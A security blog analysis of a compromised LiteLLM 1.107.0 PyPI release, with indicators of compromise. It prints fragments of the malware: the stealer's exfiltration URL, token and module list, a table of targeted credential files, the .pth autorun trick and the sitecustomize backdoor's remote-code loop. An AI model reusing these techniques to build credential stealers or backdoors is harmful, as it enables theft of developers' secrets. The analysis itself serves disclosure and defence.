---
title: Compromised LiteLLM 1.107.0 on PyPI Installs a Credential Stealer and Backdoor - Real-time Open Source Software Supply Chain Security
url: https://safedep.io/litellm-pypi-compromise-credential-stealer-backdoor/
site_name: hackernews_api
content_file: hackernews_api-compromised-litellm-11070-on-pypi-installs-a-crede
fetched_at: '2026-10-21T22:06:17.329422'
original_url: https://safedep.io/litellm-pypi-compromise-credential-stealer-backdoor/
author: abhisek
date: '2026-10-21'
description: LiteLLM 1.107.0 on PyPI ships a .pth credential stealer and a sitecustomize.py backdoor that run on every Python start. How the implant got in, what it steals, and indicators of compromise.
tags:
- hackernews
- trending
---

Back to Blog
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

# Compromised LiteLLM 1.107.0 on PyPI Installs a Credential Stealer and Backdoor

 
 
 
 
 
* Security
 
 
 
 
 
 
 
 
 Kunal Singh 
 
 
•
 
 Oct 21, 2026 
 
•
 
6 min read
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
On this page
 
 6 sections

 
 
 
 
 

On this page

 
 
 
 
 
 
 
 
 
 
 
 
 
 

TheLiteLLM 1.107.0release on PyPI carries a credential stealer and a
remote code execution backdoor. All seven wheels (Linux, macOS, Windows) install them as three files insite-packages. Both run when any Python process starts on the host, even one that never importslitellm. The
upstream GitHub source does not contain them. PyPI has since removed the release.

Versions 1.106.2, 1.107.0rc1, and 1.107.0rc2 are clean. The companion packages that 1.107.0 pins,litellm-proxy-extras==0.4.110andlitellm-enterprise==0.1.78, are also clean.

## What the attack does

Installinglitellm==1.107.0places three files insite-packages. Python loads two of them each time it starts.

1. cook.pthimportscook.py, a credential stealer. It collects SSH keys, cloud credentials, CI/CD secrets, AI tool
tokens, browser passwords, and the LLM provider keys in a LiteLLM proxy database. It encrypts the data and sends it towww.litellm[.]dev.
2. sitecustomize.pystarts a background daemon. Every hour, the daemon reads a server address from a GitHub file,
runs the stealer again, and downloads and runs code from that server.

## How the implant got into the release

Thepyproject.tomlin the 1.107.0 source distribution (sdist) has one extra line in thematurinbuild section:

 
 
 
 
 
 
 
 
 
 
 
pyproject.toml (litellm-1.107.0.tar.gz)
 
 
 
 
 
 
 
 
Copy
 
 
 
 
 
 
 
 
1
2
3
4
5
6
 
 
 
 
[
tool
.
maturin
]

...

python-source = 
"."

data = 
"cook"
 # <-- injected

python-packages = [
"litellm_cli"
] 
# legitimate (present upstream)
 
 
 
 
 
 
TOML
 
6 lines
 
 

Thematurindata = "cook"setting copies acook/folder intolitellm-1.107.0.data/purelib/in the wheel. pip
installs that folder intosite-packages.

The sdist leaves out thecook/folder, so this line is the only visible change. No public commit inBerriAI/litellmcontainsdata = "cook"or acook/folder.

The wheelRECORDlists the three added files:

 
 
 
 
 
 
 
 
 
 
 
litellm-1.107.0.dist-info/RECORD
 
 
 
 
 
 
 
 
Copy
 
 
 
 
 
 
 
 
1
2
3
4
 
 
 
 
litellm-1.107.0.data/purelib/cook.pth 12 bytes "import cook"

litellm-1.107.0.data/purelib/cook.py 22252 bytes exec(zlib.decompress(b64decode(...)))

litellm-1.107.0.data/purelib/sitecustomize.py 25509 bytes loader/backdoor + embedded stealer
 
 
 
 
 
 
TEXT
 
4 lines
 
 

### The release does not match its tag

The tagv1.107.0points to commit66c8f5b(06:59 UTC). Itspyproject.tomlsaysversion = "1.108.0". SafeDep compared every sdist file with the git trees by blob hash. The sdist
matches a latermaincommit,a8113b0(08:50 UTC), plus five
edited files and thecook/folder.

Four of the edited files areCargo.tomlfiles that gain areadme = "README.md"line. The legitimate 1.106.2 and rc2
releases have the same edit. The fifth ispyproject.toml, compared here witha8113b0:

 
 
 
 
 
 
 
 
 
 
 
pyproject.toml (a8113b0 → litellm-1.107.0.tar.gz)
 
 
 
 
 
 
 
 
Copy
 
 
 
 
 
 
 
 
1
2
3
4
5
6
7
8
9
10
11
 
 
 
 
-
version = "1.108.0"

+
version = "1.107.0"

-
 "litellm-proxy-extras==0.4.111",

-
 "litellm-enterprise==0.1.79",

+
 "litellm-proxy-extras==0.4.110", # same pins as 1.107.0rc2

+
 "litellm-enterprise==0.1.78",

+
data = "cook" # the injection

 ...

-
version = "1.108.0" # second version field

+
version = "1.107.0"
 
 
 
 
 
 
DIFF
 
11 lines
 
 

The edit sets the version back to 1.107.0 and pins the companion packages to the rc2 values. As a result, a dependency diff against rc2 shows nothing unusual. The legitimate 1.106.2 sdist matches its tag commit49943cdexcept for theCargo.tomlreadmelines.

### How the wheels were built

The malicious wheels match the output of the normal BerriAI release pipeline:

* TheWHEELfile namesmaturin1.9.4, the same version as in the legitimate releases. The implant files have correctRECORDentries, which shows no edits after the build.
* Zip timestamps show separate native builds: macOS at 11:20, Linux at 11:21, and Windows at 11:37 UTC.
* In the Windows wheel, all 2,804.pyfiles have CRLF line endings, including the three implant files. The Linux
wheel has none. A git checkout on Windows with line-ending conversion produces this pattern.

No public GitHub Actions run built or published the release. SafeDep checked all 539 runs between 09:30 and 12:30 UTC.
At 11:50 UTC, about 10 minutes after the PyPI upload,litellm-dispatcher[bot]published the GitHub releasev1.107.0. The same delay occurred for 1.106.2. PyPI has no provenance attestations for 1.107.0, 1.106.2, or rc2.

SafeDep assesses, with moderate to high confidence, that BerriAI’s private release pipeline built these wheels from an
attacker-modified git source. The attacker could have used a compromised maintainer or bot credential, a private branch or mirror, or the reference the pipeline builds from. A stolen PyPI token used from the attacker’s own machines fits the evidence less
well. Only BerriAI’s pipeline logs can confirm the cause.

## Payload 1: the credential stealer in cook.py

At startup, Python runs each line that starts withimportin a.pthfile insite-packages.cook.pthcontainsimport cook, so the stealer runs in every Python process on the host: the application, pip, IDE language servers, and
CI jobs.

cook.pywraps about 61 KB of Python in one layer ofexec(zlib.decompress(base64.b64decode('...'))). The decoded
code starts with this configuration:

 
 
 
 
 
 
 
 
 
 
 
cook.py (decoded)
 
 
 
 
 
 
 
 
Copy
 
 
 
 
 
 
 
 
1
2
3
4
5
6
7
8
9
10
 
 
 
 
PC_URL
 =
 'http://www.litellm.dev/healthcheck'

PC_TOKEN
 =
 'XWiA8gZNa7NcX2XRoAEb'
 # sent as X-Token header

PC_PUBKEY
 =
 '-----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvxRBQMVXDXVskKS47haU ...'
 # RSA-4096

PC_ONCE_PATH
 =
 '/tmp/.pc_once_72129118c59f5636c0bb'

PC_ASYNC
 =
 True
 # runs in a daemon thread

PC_MODULES
 =
 [
'sysinfo'
,
'netinfo'
,
'browser_pw'
,
'browser_hist'
,
'ssh_keys'
,

 'shell_hist'
,
'cloud_creds'
,
'dev_secrets'
,
'container_creds'
,

 'cicd_secrets'
,
'ai_devtools'
,
'env_vars'
,
'db_litellm'
,

 'cloud_metadata'
,
'gpg_keys'
,
'tls_privkey'
]
 
 
 
 
 
 
PYTHON
 
10 lines
 
 

### What it collects

Module
Targets
sysinfo
, 
netinfo
Host name, user, operating system, IP addresses, network settings
browser_pw
Chromium saved passwords, decrypted with the profile master key (DPAPI on Windows). Firefox 
logins.json
 and 
key4.db
browser_hist
Browser history
ssh_keys
~/.ssh/*
shell_hist
bash
 and 
zsh
 history, PowerShell PSReadLine, 
cmd
 history
cloud_creds
~/.aws/credentials
 and 
config
, Azure profile and tokens, 
gcloud
 credentials, 
~/.kube/config
, 
~/.docker/config.json
, 
gh
 
hosts.yml
, 
rclone.conf
, 
~/.netrc
dev_secrets
.pem
, 
.key
, 
.pfx
, 
.p12
, 
.pk8
, 
.ppk
 files under 
$HOME
, Composer 
auth.json
, FileZilla saved servers
container_creds
Kubernetes service account token
cicd_secrets
GitLab runner 
config.toml
, Jenkins 
initialAdminPassword
 and 
master.key
, 
.vault-token
, Terraform 
credentials.tfrc.json
, Packer settings
ai_devtools
Claude Code, Claude Desktop, Cursor, Windsurf, Copilot, VS Code 
mcp.json
, Gemini CLI, Codex 
auth.json
, Continue, Aider, Goose, 
opencode
, 
Qwen
, Crush, 
Kiro
, Zed, Hugging Face token
env_vars
Its own environment and the environment of other processes through 
/proc/<pid>/environ
db_litellm
Reads 
DATABASE_URL
 and dumps the 
LiteLLM_CredentialsTable
 and 
LiteLLM_ProxyModelTable
 tables, which hold the LLM provider API keys of a LiteLLM proxy
cloud_metadata
AWS instance metadata service (IMDSv2, then v1): instance identity and role credentials
gpg_keys
, 
tls_privkey
GPG keys, TLS private keys

### How it sends the data

1. It encrypts the JSON results with a random AES-256-CBC key, and encrypts that key with RSA-OAEP and the embedded
public key.
2. It packs the result into a tar.gz (hdr.json,data.bin,key.bin) and sends it in a POST request towww.litellm[.]dev/healthcheckwith the headerX-Token: XWiA8gZNa7NcX2XRoAEb.
3. After a successful upload, it writes/tmp/.pc_once_72129118c59f5636c0bbso it collects only once per host. It
also setsPRIVCOLLECT_ACTIVE=1to avoid a second run in the same process tree.

## Payload 2: the backdoor in sitecustomize.py

Python importssitecustomizeat startup, so this file also runs in every Python process.

 
 
 
 
 
 
 
 
 
 
 
sitecustomize.py
 
 
 
 
 
 
 
 
Copy
 
 
 
 
 
 
 
 
1
2
3
4
5
 
 
 
 
GITHUB_RAW_URL
 =
 "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"

CODE_PATH
 =
 "/codepy"

LOOP_INTERVAL
 =
 3600

LOCK_FILE
 =
 "/tmp/remote_code_loader.lock"
 
 
 
 
 
 
PYTHON
 
5 lines
 
 

1. It takes an exclusive lock on/tmp/remote_code_loader.lock, so only one daemon runs per host.
2. It callsfork()andsetsid(), sends standard input and output to/dev/null, and changes directory to/to
detach from the parent process.
3. Every hour, it:readsdomain.txtfrom the attacker’s GitHub repository and takes the first line that looks like a domain,runs its embedded copy of the stealer, which has no once-per-host marker,downloadshttp://<domain>/codepyand runs it withexec().
4. readsdomain.txtfrom the attacker’s GitHub repository and takes the first line that looks like a domain,
5. runs its embedded copy of the stealer, which has no once-per-host marker,
6. downloadshttp://<domain>/codepyand runs it withexec().

The attacker can point the daemon at a new server by editingdomain.txt. Each infected host runs whatever that server
returns ascodepy.

At 13:40 UTC, the GitHub accountletters9813and its repository returned 404, about two hours after the release. The
backdoor now finds no server address and does nothing. Hosts that ran the daemon before the deletion could have
received and run second-stage code. SafeDep could not recover the server address.

## Timeline

All times are UTC on 2026-10-21.

Time
Event
06:59
Tag 
v1.107.0
 commit 
66c8f5b
 created
08:50
Commit 
a8113b0
 on 
main
, the base of the release source
10:44
Legitimate 1.106.2 uploaded to PyPI
11:20 to 11:37
Malicious 1.107.0 wheels built
11:39 to 11:40
1.107.0 uploaded to PyPI (all 8 files)
11:50
litellm-dispatcher[bot]
 publishes GitHub release 
v1.107.0
13:40
Observed: 1.107.0 gone from PyPI, 
letters9813
 account deleted

## Indicators of compromise

### Network

Indicator
Purpose
www.litellm[.]dev
, 
hxxp://www.litellm[.]dev/healthcheck
Receives stolen data
HTTP header 
X-Token: XWiA8gZNa7NcX2XRoAEb
Sent with each upload
raw.githubusercontent[.]com/letters9813/pythonclient-test/main/domain.txt
Backdoor reads its server address here (account deleted)
hxxp://<domain>/codepy
Second-stage code download
Requests to 
169.254.169.254
 from Python processes
Theft of AWS instance credentials

### Host

Indicator
Meaning
cook.pth
, 
cook.py
, 
sitecustomize.py
 in 
site-packages
Implant installed
/tmp/.pc_once_72129118c59f5636c0bb
Stealer already uploaded data
/tmp/remote_code_loader.lock
Backdoor daemon has run
Environment variable 
PRIVCOLLECT_ACTIVE=1
Present in infected processes
Detached Python daemon (parent PID 1, own session, working directory 
/
)
Backdoor loop

### File hashes (SHA-256)

File
SHA-256
litellm-1.107.0.tar.gz
2befe2a79fb4fbbd9a543b5b40b530c8cffa8771bab22b8fb22b2e4ae3b1f819
litellm-1.107.0-cp310-abi3-manylinux_2_28_x86_64.whl
462d0c9f67ca522d9e0e4acd245e90b36ce0d5353604a66bb7c43a1ec4a6fcf7
litellm-1.107.0-cp310-abi3-manylinux_2_28_aarch64.whl
668169d35b87bf51324080390b1b1c5ab12bd335cfe5f1a99e3689abd5e02ae6
litellm-1.107.0-cp310-abi3-musllinux_1_2_x86_64.whl
1bbce8caa94f01c0aaa0b7ddae51553a8a32e1ce53d96d44fe583272aff7ad00
litellm-1.107.0-cp310-abi3-musllinux_1_2_aarch64.whl
c2e32d0ce2548aa662c18bf5001911a79fe5b30cf8357132275add02fdcde054
litellm-1.107.0-cp310-abi3-macosx_10_12_x86_64.whl
7598727f209d717041db37f7dca271d3a7d328a279890e0e1d55375729aeb86d
litellm-1.107.0-cp310-abi3-macosx_11_0_arm64.whl
0aaf7ba346d41ef2f40390436738b001180d5a1c03aa093f121078a9969d9a1a
litellm-1.107.0-cp310-abi3-win_amd64.whl
12d4ccc5c6f8d35cf4f2cf233b7f3e418e863e657d81ff5f5fc9e210005b9484

The planted files have different hashes on Windows because of the CRLF line endings:

File
Linux and macOS
Windows
cook.pth
7f191632e7320705d154b85204f1ae546b543acbd7e8861229b76f5042b92bdb
84dc8c82c0a4a4a62552ef826b49fcc86d1a5c4a5d0f2c06665723f93d129d7d
cook.py
9dd0a3926f96a37eb86cf1ee2310d9be93139cc4ebef3ef9e2efe9531390be25
03ac2a8b752605d1d7710979c17ff18b03dd978203ba23ba97fd8ce3d6f897ea
sitecustomize.py
34bef04fe88ac9d0aae0475630b1738681d15b94f233ac8aa46eacf5968305fa
b6122440d0d9cb1eb1ade9933f49214da8c31288de7710c076c2680dfa528465
 
 
 
 
 
* pypi
* python
* malware
* supply-chain
* litellm
 
 
 
 
 
 
 
 
 
 
 
 
 

### Author

 
 
 
 

#### Kunal Singh

 

safedep.io

 
 
 
 
 
 

### Share

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

## The Latest fromSafeDep blogs

 
 
 
 

Follow for the latest updates and insights on open source security & engineering

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
* Security
 
 
 
 

An attacker pushed forged commits to the default branches of hugo-paper and mevn-cli. Running npm install or bun install in either repository downloads and runs a second-stage script from...

 
 
 
 
 
 
 
 
 
 
 
 
* Security
 
 
 
 

Attackers got into the platforms ASOS uses to message customers and pushed an extortion note to phones. Here is what is confirmed, what is only claimed, and what customers should do.

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
* Security
 
 
 
 

The MALFEX package imgdecode contains a native Windows loader. When loaded from a console, it attempts to download, decrypt, and inject shellcode into dllhost.exe.

 
 
 
 
 
 
 
 
 
 
 
 
* Malware
 
 
 
 

[email protected]on npm ran a Mini Shai-Hulud worm at install. A maintainer account committed the payload through the GitHub web interface, and the official release workflow published it.

 
 
 
 
 
 View All Blogs 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

## Ship Code.

 

## Not Malware.

 
 
 

Start free with open source tools on your machine. Scale to a unified platform for your organization.

 
 
 
 
 Star on GitHub 
 

Book a Demo